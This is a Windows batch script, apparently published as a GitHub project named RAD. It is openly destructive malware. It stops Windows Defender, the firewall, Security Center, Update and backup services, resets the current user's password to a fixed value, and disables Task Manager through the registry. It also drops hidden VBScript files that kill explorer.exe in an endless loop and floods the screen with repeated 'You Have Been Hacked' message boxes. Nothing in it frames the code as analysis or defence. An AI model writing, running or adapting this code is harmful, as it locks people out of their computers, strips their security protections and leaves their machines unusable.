::__--- https://github.com/muneebwanee/RAD ---__::
@echo off
::-Disable Windows Backup-::
net stop "SDRSVC"
::------------------------::
::-Disable Windows Firewall--::
net stop "MpsSvc"
taskkill /f /t /im "FirewallControlPanel.exe"
::---------------------------::
::-Disable Windows Security Center-::
net stop "wscsvc"
::---------------------------------::
::--Disable Windows Defender-::
net stop "WinDefend"
taskkill /f /t /im "MSASCui.exe"
::---------------------------::
::---Disable Windows Update--::
net stop "wuauserv"
::---------------------------::
::-Disable Windows Parental Controls-::
net stop "WPCSvc"
::-----------------------------------::
::-Disable Windows Error Reporting-::
net stop "WerSvc"
::---------------------------------::
::--Disable Windows Search---::
net stop "WSearch"
::---------------------------::
::--Change Pass To InShadow--::
net user %username% InShadow
::---------------------------::
::---Disable Taskmanager-----::
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
::---------------------------::
::-----Kill Explorer.exe-----::
echo :a >>WindUpdate.bat
echo tskill explorer >>WindUpdate.bat
echo goto a >>WindUpdate.bat
echo Set objShell = CreateObject("WScript.Shell")>>rundlll32.vbs
echo strCommand = "WindUpdate.bat">>rundlll32.vbs
echo objShell.Run strCommand, vbHide, TRUE>>rundlll32.vbs
start "" rundlll32.vbs
::---------------------------::
::------MsgBox Function------::
echo x=msgbox("RAD",vbCritical or vbOkOnly,"YOU DEAD BY") >>dll32.vbs
start "" "dll32.vbs"
::---------------------------::
start http://www.MyWebSite.com
::--------MsgBox Spam--------::
echo Do>>msgbox.vbs
echo x=msgbox("You Have Been Hacked.",vbExclamation or vbOkOnly,"Hacked") >>msgbox.vbs
echo Loop>>msgbox.vbs
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
::---------------------------::
